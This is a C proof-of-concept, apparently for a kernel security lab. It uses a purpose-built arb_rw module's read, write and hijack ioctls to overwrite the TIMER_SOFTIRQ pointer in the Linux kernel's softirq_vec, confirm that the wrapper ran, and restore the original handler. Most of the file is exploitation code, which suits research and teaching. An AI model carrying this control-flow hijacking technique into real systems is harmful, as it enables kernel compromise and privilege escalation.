// FZY: Control-flow hijacking proof of concept that overwrites the function pointer in softirq_vec (array of struct softirq_action) to redirect softirq handling to a wrapper gadget function

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>

#define POINTER_SIZE 8

// Hijack TIMER_SOFTIRQ (softirq #1), which is triggered by system timer ticks. This is a reliable softirq to trigger that fires constantly (HZ times per second)
#define TARGET_SOFTIRQ_NR 1  // TIMER_SOFTIRQ

// How long to wait for a hijacked tick: WAIT_STEPS polls of WAIT_STEP_US each
#define WAIT_STEP_US 10000
#define WAIT_STEPS 100

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

struct softirq_hijack_request {
  unsigned long softirq_vec_addr;  // Base address of softirq_vec array
  int softirq_nr;                  // Which softirq to hijack (0-9)
  unsigned long original_handler;  // Output: the original handler address
  unsigned long wrapper_addr;      // Output: the wrapper address that was written
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_HIJACK_SOFTIRQ _IOWR('A', 4, struct softirq_hijack_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

void hijack_softirq(int fd, unsigned long softirq_vec_addr, int softirq_nr) {
  struct softirq_hijack_request req = {
    .softirq_vec_addr = softirq_vec_addr,
    .softirq_nr = softirq_nr,
    .original_handler = 0,
    .wrapper_addr = 0
  };
  
  printf("[+] Calling ARB_HIJACK_SOFTIRQ ioctl to hijack softirq_vec[%d]\n", softirq_nr);
  printf("[+] softirq_vec base address: 0x%lx\n", softirq_vec_addr);
  
  if (ioctl(fd, ARB_HIJACK_SOFTIRQ, &req) < 0) {
    perror("hijack_softirq");
    exit(1);
  }
  
  printf("[+] Softirq handler hijacked successfully!\n");
  printf("[+] Original handler: 0x%lx\n", req.original_handler);
  printf("[+] Wrapper address: 0x%lx\n", req.wrapper_addr);
}

// The wrapper restores the entry on its first invocation, so the entry going
// back to its old value is what tells us the hijacked handler ran
void wait_for_hijack(int fd, unsigned long action_addr, unsigned long original_handler) {
  printf("[+] Waiting for a timer interrupt to run our hijacked handler...\n");

  for (int i = 1; i <= WAIT_STEPS; i++) {
    unsigned long current = 0;

    usleep(WAIT_STEP_US);
    arb_read(fd, action_addr, &current, POINTER_SIZE);

    if (current == original_handler) {
      printf("[+] Wrapper ran within ~%d ms and restored the entry itself\n",
             i * WAIT_STEP_US / 1000);
      printf("[+] You should see '*** SOFTIRQ HIJACKING SUCCESS! ***' in kernel log\n");
      return;
    }
  }

  printf("[-] softirq_vec entry still points at the wrapper after %d ms\n",
         WAIT_STEPS * WAIT_STEP_US / 1000);
}

// Safety net for the case where the wrapper never ran, a no-op otherwise
void restore_softirq(int fd, unsigned long softirq_vec_addr, 
                     int softirq_nr, unsigned long original_handler) {
  unsigned long action_addr = softirq_vec_addr + (softirq_nr * POINTER_SIZE);
  unsigned long current = 0;

  arb_read(fd, action_addr, &current, POINTER_SIZE);

  if (current != original_handler) {
    printf("[+] Restoring softirq_vec[%d].action to original handler 0x%lx\n", 
           softirq_nr, original_handler);
    arb_write(fd, action_addr, &original_handler, POINTER_SIZE);
    arb_read(fd, action_addr, &current, POINTER_SIZE);
  }

  if (current != original_handler)
    printf("[-] WARNING: Restoration verification failed!\n");
  else
    printf("[+] Softirq handler successfully restored\n");
}

int main(int argc, char *argv[]) {
  printf("[+] softirq_vec function pointer hijacking proof of concept\n");
  printf("[+] Target: TIMER_SOFTIRQ (softirq #%d)\n", TARGET_SOFTIRQ_NR);
  printf("[+] This softirq is triggered automatically by timer interrupts\n");

  if (argc != 2) {
    printf("Usage: %s <softirq_vec_addr>\n", argv[0]);
    printf("  Get softirq_vec address: nm vmlinux | grep softirq_vec\n");
    return 1;
  }

  unsigned long softirq_vec_addr = strtoul(argv[1], NULL, 16);

  if (softirq_vec_addr == 0) {
    printf("[-] Invalid softirq_vec address\n");
    return 1;
  }

  printf("[+] Opening /dev/arb_rw...\n");
  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("[-] Failed to open /dev/arb_rw");
    printf("[-] Make sure the arb_rw kernel module is loaded\n");
    exit(1);
  }
  printf("[+] Device opened successfully\n");

  // Read original handler before hijacking
  unsigned long original_handler = 0;
  unsigned long action_addr = softirq_vec_addr + (TARGET_SOFTIRQ_NR * POINTER_SIZE);
  arb_read(arbrw_dev_fd, action_addr, &original_handler, POINTER_SIZE);
  printf("[+] Original softirq_vec[%d].action = 0x%lx\n", TARGET_SOFTIRQ_NR, original_handler);

  hijack_softirq(arbrw_dev_fd, softirq_vec_addr, TARGET_SOFTIRQ_NR);

  // One-shot: the first hijacked tick reports once and undoes the overwrite,
  // instead of one report per tick per CPU until userspace restores it
  wait_for_hijack(arbrw_dev_fd, action_addr, original_handler);

  restore_softirq(arbrw_dev_fd, softirq_vec_addr, TARGET_SOFTIRQ_NR, original_handler);

  close(arbrw_dev_fd);
  
  printf("[+] PoC completed successfully!\n");
  printf("[+] Check kernel log with: sudo dmesg | tail -20\n");
  
  return 0;
}